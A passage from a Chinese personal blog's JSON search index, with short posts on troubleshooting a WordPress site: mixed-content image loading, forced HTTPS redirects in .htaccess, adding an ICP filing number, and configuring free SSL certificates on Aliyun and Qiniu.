1、由于浏览器直接访问七牛云图床的url地址是可以访问的，证明地址并没错，有没有可能是referer防盗链的配置问题\n查看防盗链配置，并没有开\n2、wordpress可以加载出来csdn的外链图片，期间也试了其他图床都是没问题的。\n3、看看七牛的图片外链和csdn的有何区别\n注意到七牛的图片外链是http，当时嫌麻烦并没有配置https，看来问题是出在这了\n因为我的网站配置了ssl证书，可能由于安全问题浏览器不予加载http项目，用http访问站点测试下图片是否可以加载\n访问成功了！\n解决 给七牛云的域名配置ssl证书\n","permalink":"https://lvbibir.github.io/posts/blog/wordpress_load_image_failed/","summary":"现象 博客加载不出来我在七牛云的图片资源 使用浏览器直接访问图片url却是可以成功的 我将之前csdn的博客迁移到了wordpress，图片外链地","title":"wordpress加载图片失败"},{"content":"文章编辑界面和预览界面都是没问题的，发布出来后文章内容的http变成了https，而且仅有本博客域名lvbibir.cn出现这种情况，其他都正常\n发布后：\n初步判断是由于在wordpress的伪静态文件中配置了http强制跳转导致的\n","permalink":"https://lvbibir.github.io/posts/blog/wordpress_editpage_different_post/","summary":"文章编辑界面和预览界面都是没问题的，发布出来后文章内容的http变成了https，而且仅有本博客域名lvbibir.cn出现这种情况，其他都","title":"wordpress文章编辑页和发不出来内容不一样（http变成了https）"},{"content":"默认主题下在后台设置里修改即可\n自定义主题或者其他主题需要修改footer.php文件\n在\u0026lt;footer\u0026gt;\u0026lt;/footer\u0026gt;中添加如下代码\n\u0026lt;div style=\u0026#34;text-align:center\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;http://beian.miit.gov.cn/\u0026#34; rel=\u0026#34;external nofollow\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt; \u0026lt;?php echo get_option( \u0026#39;zh_cn_l10n_icp_num\u0026#39; ); ?\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; dux主题修改方式：在后台管理→dux主题编辑器→网站底部信息中添加\n\u0026lt;a href=\u0026#34;http://beian.miit.gov.cn/\u0026#34; rel=\u0026#34;external nofollow\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;京ICP备2021023168号-1\u0026lt;/a\u0026gt; ","permalink":"https://lvbibir.github.io/posts/blog/wordpress_add_icp/","summary":"默认主题下在后台设置里修改即可 自定义主题或者其他主题需要修改footer.php文件 在\u0026lt;footer\u0026gt;\u0026lt;/footer\u0026g","title":"wordpress添加icp备案号"},{"content":"本文介绍如何在阿里轻量服务器wordpress站点配置http强制跳转到https\n配置强制跳转前需要站点已经安装了ssl证书，可以通过https正常访问\n[阿里云wordpress配置免费ssl证书]\n一般站点需要在httpd.conf中的\u0026lt;VirtualHost *:80\u0026gt; \u0026lt;/VirtualHost\u0026gt;中配置重定向\n与一般站点不同，wordpress需要在伪静态文件（.htaccess）中配置重定向，无需在httpd.conf中配置\n修改伪静态文件（.htaccess） 伪静态文件一般在网页根目录，是一个隐藏文件\n在#END Wordpress前添加如下重定向代码，记得把域名修改成自己的\nRewriteEngine On RewriteCond %{HTTPS} !on RewriteRule ^(.*)$ https://lvbibir.cn/%{REQUEST_URI} [L,R=301] 图中两段重定向代码略有不同\n第一段代码重定向触发器：当访问的端口不是443时进行重定向重定向规则：重定向到：https://{原域名}/{原url资源} 第二段代码重定向触发器：当访问的协议不是 TLS/SLL（https）时进行重定向重定向规则：重定向到：https://lvbibir.cn/{原url资源} 第一段代码使用端口判断，第二段代码通过访问方式判断，建议使用访问方式判断，这样服务改了端口也可以正常跳转 第一段代码重定向的原先的域名，第二段代码可以把ip地址重定向到指定域名 测试 curl -I http://lvbibir.cn 使用http访问站点的80端口成功通过301跳转到了https\n参考 https://help.aliyun.com/document_detail/98727.html?spm=5176.smartservice_service_chat.0.0.1508709aJMmZwg\nhttps://blog.csdn.net/weixin_39037804/article/details/102801202\n","permalink":"https://lvbibir.github.io/posts/blog/wordpress_https/","summary":"本文介绍如何在阿里轻量服务器wordpress站点配置http强制跳转到https 配置强制跳转前需要站点已经安装了ssl证书，可以通过htt","title":"wordpress配置https强制跳转"},{"content":"1、购买免费证书 2、补全域名信息 3、域名验证 根据在域名提供商处新建解析\ndns配置好之后等待CA机构审核后颁发证书就可以了\n4、 为域名开启https 5、修改PicGo的配置 ","permalink":"https://lvbibir.github.io/posts/blog/qiniu_ssl/","summary":"1、购买免费证书 2、补全域名信息 3、域名验证 根据在域名提供商处新建解析 dns配置好之后等待CA机构审核后颁发证书就可以了 4、 为域名开启htt","title":"七牛云配置免费ssl证书"},{"content":"1、登录阿里云，选择产品中的ssl证书\n如果域名是阿里的他会自动创建dns解析，如果是其他厂商需要按照图片配置，等待几分钟进行验证\n点击审核，等待签发\n签发后根据需求下载所需证书\n我的wordpress是直接买的阿里轻量应用服务器，打开轻量应用服务器的控制台配置域名\n选择刚申请好的ssl证书\n在wordpress后台修改地址\n大功告成\n","permalink":"https://lvbibir.github.io/posts/blog/wordpress_ssl/","summary":"1、登录阿里云，选择产品中的ssl证书 如果域名是阿里的他会自动创建dns解析，如果是其他厂商需要按照图片配置，等待几分钟进行验证 点击审核，等","title":"阿里云wordpress配置免费ssl证书"},{"content":"","permalink":"https://lvbibir.github.io/posts/read/read/","summary":"","title":"Read"}]